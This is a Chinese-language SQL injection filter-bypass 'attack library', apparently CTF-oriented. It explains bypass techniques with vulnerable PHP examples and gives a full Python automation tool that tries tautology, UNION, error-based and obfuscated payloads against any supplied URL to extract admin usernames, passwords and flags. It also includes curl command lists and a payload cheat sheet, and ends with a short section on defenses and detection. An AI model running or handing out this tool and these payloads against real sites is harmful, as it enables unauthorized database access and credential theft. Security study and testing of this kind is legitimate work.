# SQL注入 - 简单过滤绕过攻击库

## 概述

SQL注入简单过滤绕过是指应用程序实施了基础的过滤机制(如黑名单关键字、简单字符替换等),但这些防护措施可以被轻易绕过。攻击者通过各种技术(注释符、大小写混淆、编码、逻辑运算符等)绕过过滤,执行SQL注入攻击。

**核心威胁**: 简单过滤 → 黑名单不完整 → 绕过技术 → SQL注入成功

## 常见简单过滤类型

### 1. 严格相等检查

```php
// 只检查严格相等,可用逻辑运算符绕过
if ($category == "Secret") {
    $category = "";  
}
$sql = "SELECT * FROM posts WHERE category = '$category'";
```

**绕过**: 
- `' OR category='Secret' --`
- `' OR category LIKE 'Secret%' --`

### 2. 关键字黑名单

```php
// 简单替换特定关键字
$input = str_replace(['UNION', 'SELECT'], '', $input);
$sql = "SELECT * FROM users WHERE id = $input";
```

**绕过**:
- 大小写: `UnIoN SeLeCt`
- 双写: `UNUNIONION SELSELECTECT` → 替换后变回`UNION SELECT`
- 注释: `UN/**/ION SE/**/LECT`

### 3. 单引号转义

```php
// 只转义单引号
$input = str_replace("'", "''", $input);
$sql = "SELECT * FROM users WHERE name = '$input'";
```

**绕过**:
- 使用反斜杠: `\` (在某些配置下)
- 使用十六进制: `0x61646d696e` (admin)
- 宽字节注入: `%df%27` (GBK编码)

### 4. 空格过滤

```php
// 替换空格
$input = str_replace(' ', '', $input);
$sql = "SELECT * FROM users WHERE id = $input";
```

**绕过**:
- 注释符: `/**/`
- Tab符: `%09`
- 换行符: `%0a`, `%0d`
- 括号: `()`

## 核心绕过技术

### 1. 逻辑运算符绕过

**技术**: 使用`OR`/`AND`构造永真条件绕过检查

```sql
-- 原始查询
SELECT * FROM posts WHERE category = 'Nature'

-- 绕过Secret过滤
?category=' OR category='Secret' --
?category=' OR 1=1 --
?category=' OR 'a'='a
```

**应用场景**:
- 绕过严格相等检查
- 提取被隐藏的数据
- 绕过WHERE条件

### 2. 注释符绕过

**技术**: 使用SQL注释符注释掉后续代码

```sql
-- MySQL注释符
-- 
# 
/**/

-- 示例
' OR 1=1 -- 
' OR 1=1 #
' OR 1=1 /*
```

**应用场景**:
- 注释掉后续的WHERE条件
- 绕过引号闭合检查
- 截断查询语句

### 3. UNION注入绕过

**技术**: 使用UNION查询额外数据

```sql
-- 测试列数
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --

-- 提取数据
' UNION SELECT 1,username,password,4,5 FROM admins --
' UNION SELECT 1,2,3,flag,5 FROM secret_table --
```

**列数探测技巧**:
```sql
-- 使用ORDER BY
' ORDER BY 1 --  (正常)
' ORDER BY 2 --  (正常)
' ORDER BY 10 -- (报错,说明列数<10)
```

### 4. 大小写混淆绕过

**技术**: 混合大小写绕过关键字过滤

```sql
-- 原始: UNION SELECT
UnIoN SeLeCt
uNiOn sElEcT
UNION/**/SELECT
```

**应用场景**:
- 绕过简单的黑名单过滤
- 绕过WAF规则

### 5. 双写关键字绕过

**技术**: 重复写关键字,被替换后恢复

```sql
-- 过滤会替换UNION为空
UNUNIONION → UNION (替换后)
SELSELECTECT → SELECT
OROROR → OR

-- 示例
' UNUNIONION SELSELECTECT 1,2,3 --
```

### 6. 编码绕过

**技术**: 使用各种编码绕过过滤

```sql
-- URL编码
%27 → '
%20 → 空格
%23 → #

-- 十六进制编码
0x61646d696e → admin
SELECT 0x61646d696e → SELECT 'admin'

-- Unicode编码
\u0027 → '
```

### 7. 内联注释绕过

**技术**: 使用`/**/`分隔关键字

```sql
UN/**/ION SE/**/LECT
' OR/**/'1'='1
SEL/*foo*/ECT
```

## 完整攻击工具

### SQL注入简单过滤绕过自动化工具

```python
#!/usr/bin/env python3
"""
SQL注入简单过滤绕过自动化工具
支持多种绕过技术
"""

import requests
import urllib.parse
import sys
import re

class SQLInjectionBypass:
    def __init__(self, target_url, param='category'):
        self.target = target_url.rstrip('/')
        self.param = param
        self.session = requests.Session()
        
    def test_injection(self, payload):
        """
        测试SQL注入payload
        
        Args:
            payload: 测试载荷
        
        Returns:
            响应对象
        """
        try:
            params = {self.param: payload}
            r = self.session.get(self.target, params=params, timeout=10)
            return r
        except Exception as e:
            print(f"[-] 请求错误: {e}")
            return None
    
    def test_basic_injection(self):
        """
        测试基本SQL注入
        """
        print("[*] 测试基本SQL注入...")
        
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 'a'='a",
            "admin' --",
        ]
        
        for payload in payloads:
            print(f"[*] 尝试: {payload}")
            r = self.test_injection(payload)
            
            if r and r.status_code == 200:
                if 'Error' not in r.text and len(r.text) > 500:
                    print(f"[+] 可能成功: {payload}")
                    if 'flag{' in r.text.lower():
                        print(f"[+] 发现FLAG!")
                        return True
        
        return False
    
    def bypass_strict_equality(self, target_value="Secret"):
        """
        绕过严格相等检查
        
        Args:
            target_value: 被过滤的值
        """
        print(f"[*] 绕过严格相等检查 (目标: {target_value})...")
        
        payloads = [
            f"' OR category='{target_value}' --",
            f"' OR category='{target_value}' #",
            f"' OR category LIKE '{target_value}%' --",
            f"' OR category='{target_value}",
            f"' UNION SELECT * FROM posts WHERE category='{target_value}' --",
        ]
        
        for payload in payloads:
            print(f"[*] 尝试: {payload}")
            r = self.test_injection(payload)
            
            if r and r.status_code == 200:
                if target_value in r.text or 'flag' in r.text.lower():
                    print(f"[+] 成功绕过! Payload: {payload}")
                    if 'flag{' in r.text.lower():
                        match = re.search(r'flag\{[^}]+\}', r.text, re.I)
                        if match:
                            print(f"[+] FLAG: {match.group()}")
                            return True
        
        return False
    
    def test_union_injection(self):
        """
        测试UNION注入
        """
        print("[*] 测试UNION注入...")
        
        # 1. 探测列数
        print("[*] 探测列数...")
        cols = 0
        for i in range(1, 15):
            null_list = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {null_list} --"
            r = self.test_injection(payload)
            
            if r and 'Error' not in r.text:
                cols = i
                print(f"[+] 列数: {cols}")
                break
        
        if cols == 0:
            print("[-] 无法确定列数")
            return False
        
        # 2. 查找显示位
        print("[*] 查找显示位...")
        num_list = ','.join([str(i) for i in range(1, cols + 1)])
        payload = f"' UNION SELECT {num_list} --"
        r = self.test_injection(payload)
        
        if r:
            # 查找哪些数字显示在页面上
            visible_cols = []
            for i in range(1, cols + 1):
                if str(i) in r.text:
                    visible_cols.append(i)
            print(f"[+] 可见列: {visible_cols}")
        
        # 3. 提取数据
        print("[*] 尝试提取数据...")
        
        # 尝试不同的表名和列名
        targets = [
            ("posts", "category", "Secret"),
            ("posts", "content", "flag"),
            ("admins", "username", None),
            ("admins", "password", None),
            ("flags", "flag", None),
            ("secret", "data", None),
        ]
        
        for table, column, where_value in targets:
            # 构造UNION查询
            select_items = []
            for i in range(1, cols + 1):
                if i == visible_cols[0] if visible_cols else 1:
                    select_items.append(column)
                else:
                    select_items.append('NULL')
            
            select_str = ','.join(select_items)
            
            if where_value:
                payload = f"' UNION SELECT {select_str} FROM {table} WHERE {column}='{where_value}' --"
            else:
                payload = f"' UNION SELECT {select_str} FROM {table} LIMIT 1 --"
            
            print(f"[*] 尝试: {payload[:80]}...")
            r = self.test_injection(payload)
            
            if r and 'Error' not in r.text:
                if 'flag{' in r.text.lower():
                    print(f"[+] 成功! 表: {table}, 列: {column}")
                    match = re.search(r'flag\{[^}]+\}', r.text, re.I)
                    if match:
                        print(f"[+] FLAG: {match.group()}")
                        return True
        
        return False
    
    def test_error_based_injection(self):
        """
        测试报错注入
        """
        print("[*] 测试报错注入...")
        
        payloads = [
            # ExtractValue报错
            "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1))) --",
            "' AND extractvalue(1,concat(0x7e,database())) --",
            
            # UpdateXML报错
            "' AND updatexml(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)),1) --",
            
            # 几何函数报错
            "' AND geometrycollection((SELECT * FROM(SELECT * FROM flags)x)) --",
        ]
        
        for payload in payloads:
            print(f"[*] 尝试: {payload[:60]}...")
            r = self.test_injection(payload)
            
            if r:
                # 查找报错信息中的数据
                if 'XPATH' in r.text or 'geometrycollection' in r.text:
                    print(f"[+] 报错触发成功")
                    if 'flag' in r.text.lower():
                        print(f"[+] 发现FLAG!")
                        return True
        
        return False
    
    def test_bypass_techniques(self):
        """
        测试各种绕过技术
        """
        print("[*] 测试绕过技术...")
        
        # 大小写混淆
        payloads_case = [
            "' UnIoN SeLeCt 1,2,3 --",
            "' uNiOn sElEcT 1,2,3 --",
        ]
        
        # 双写关键字
        payloads_double = [
            "' UNUNIONION SELSELECTECT 1,2,3 --",
            "' OOROR 1=1 --",
        ]
        
        # 注释分隔
        payloads_comment = [
            "' UN/**/ION SE/**/LECT 1,2,3 --",
            "' OR/**/1=1 --",
        ]
        
        # 编码
        payloads_encoded = [
            "' OR 1=0x31 --",  # 0x31 = 1
            "' UNION SELECT 0x61646d696e --",  # admin
        ]
        
        all_payloads = (
            payloads_case + 
            payloads_double + 
            payloads_comment + 
            payloads_encoded
        )
        
        for payload in all_payloads:
            print(f"[*] 尝试: {payload}")
            r = self.test_injection(payload)
            
            if r and r.status_code == 200 and 'Error' not in r.text:
                if len(r.text) > 500 or 'flag' in r.text.lower():
                    print(f"[+] 绕过可能成功: {payload}")
                    if 'flag{' in r.text.lower():
                        return True
        
        return False
    
    def full_exploit(self):
        """
        完整利用流程
        """
        print("=" * 60)
        print("[*] SQL注入简单过滤绕过完整利用")
        print("=" * 60)
        
        # 1. 基本注入测试
        print("\n[*] 步骤1: 基本注入测试...")
        if self.test_basic_injection():
            return True
        
        # 2. 绕过严格相等检查
        print("\n[*] 步骤2: 绕过严格相等检查...")
        if self.bypass_strict_equality():
            return True
        
        # 3. UNION注入
        print("\n[*] 步骤3: UNION注入...")
        if self.test_union_injection():
            return True
        
        # 4. 报错注入
        print("\n[*] 步骤4: 报错注入...")
        if self.test_error_based_injection():
            return True
        
        # 5. 绕过技术
        print("\n[*] 步骤5: 测试绕过技术...")
        if self.test_bypass_techniques():
            return True
        
        return False

def exploit_sqli_bypass(target_url, param='category'):
    """
    SQL注入绕过利用入口
    
    Args:
        target_url: 目标URL
        param: 注入参数名
    """
    print(f"[*] 目标: {target_url}")
    print(f"[*] 参数: {param}")
    print()
    
    exploiter = SQLInjectionBypass(target_url, param)
    success = exploiter.full_exploit()
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击未成功,建议手动测试")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url> [param_name]")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target/?category=Nature")
        print(f"  {sys.argv[0]} http://target/?id=1 id")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'category'
    
    exploit_sqli_bypass(target, param)
```

## 实战场景

### 场景1: 绕过严格相等检查

**易受攻击代码**:
```php
if ($category == "Secret") {
    $category = "";
}
$sql = "SELECT * FROM posts WHERE category = '$category'";
```

**利用**:
```bash
curl "http://target/?category=' OR category='Secret' --"
# 绕过检查,查询Secret分类
```

### 场景2: 绕过关键字过滤

**易受攻击代码**:
```php
$input = str_replace('UNION', '', $input);
$sql = "SELECT * FROM users WHERE id = $input";
```

**利用**:
```bash
# 双写绕过
curl "http://target/?id=1 UNUNIONION SELECT username,password FROM admins"
```

### 场景3: 绕过空格过滤

**易受攻击代码**:
```php
$input = str_replace(' ', '', $input);
```

**利用**:
```bash
# 使用注释符代替空格
curl "http://target/?id=1/**/UNION/**/SELECT/**/1,2,3"

# 使用括号
curl "http://target/?id=1 UNION(SELECT(1),(2),(3))"
```

## 手动测试命令

### 基本注入测试

```bash
# 1. 测试引号注入
curl "http://target/?category='"
curl "http://target/?category=Nature'"

# 2. 测试逻辑运算符
curl "http://target/?category=' OR 1=1 --"
curl "http://target/?category=' OR '1'='1"

# 3. 测试注释符
curl "http://target/?category=' --"
curl "http://target/?category=' #"
```

### 绕过Secret过滤

```bash
# 直接访问
curl "http://target/?category=Secret"
# 被过滤,返回空

# OR绕过
curl "http://target/?category=' OR category='Secret' --"
# 成功显示Secret分类

# LIKE绕过
curl "http://target/?category=' OR category LIKE 'Secret%' --"
```

### UNION注入

```bash
# 探测列数
curl "http://target/?category=' UNION SELECT NULL --"
curl "http://target/?category=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --"

# 提取数据
curl "http://target/?category=' UNION SELECT 1,username,password,4,5,6,7 FROM admins --"
```

## Payload速查表

### 基本注入
```sql
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
admin' --
' OR 'a'='a
```

### 绕过严格相等
```sql
' OR category='Secret' --
' OR category LIKE 'Secret%' --
' UNION SELECT * FROM posts WHERE category='Secret' --
```

### 大小写混淆
```sql
UnIoN SeLeCt
uNiOn sElEcT
' oR 1=1
```

### 双写关键字
```sql
UNUNIONION SELSELECTECT
OROROR
ANANDD
```

### 注释分隔
```sql
UN/**/ION SE/**/LECT
' OR/**/1=1
SEL/**/ECT
```

### 编码绕过
```sql
%27 OR 1=1 --  (URL编码)
0x61646d696e  (十六进制: admin)
SELECT 0x31  (1)
```

## 防御措施

### 1. 使用参数化查询

```php
// 正确
$stmt = $conn->prepare("SELECT * FROM posts WHERE category = ?");
$stmt->bind_param("s", $category);
$stmt->execute();
```

### 2. 白名单验证

```php
// 只允许特定值
$allowed = ['Nature', 'Technology', 'Sports'];
if (!in_array($category, $allowed)) {
    die("Invalid category");
}
```

### 3. 输入类型验证

```php
// 数字型参数
$id = (int)$_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
```

### 4. 转义函数

```php
// MySQL
$category = mysqli_real_escape_string($conn, $_GET['category']);

// PDO
$category = $pdo->quote($_GET['category']);
```

## 检测特征

1. **SQL语法特征**: URL包含`UNION`, `SELECT`, `--`, `#`
2. **逻辑运算符**: `OR 1=1`, `AND 1=1`
3. **注释符**: `--`, `#`, `/**/`
4. **引号**: 单独的`'`或`"`

## 总结

SQL注入简单过滤绕过利用了防护措施的不完整性,主要技术:
- 逻辑运算符绕过严格相等检查
- 大小写混淆绕过关键字过滤
- 双写关键字绕过字符串替换
- 注释符分隔关键字
- 编码绕过字符过滤

**关键攻击路径**: 识别过滤机制 → 选择合适绕过技术 → 构造payload → SQL注入成功

**最简单利用**: `' OR 1=1 --`永真条件绕过大多数简单过滤。
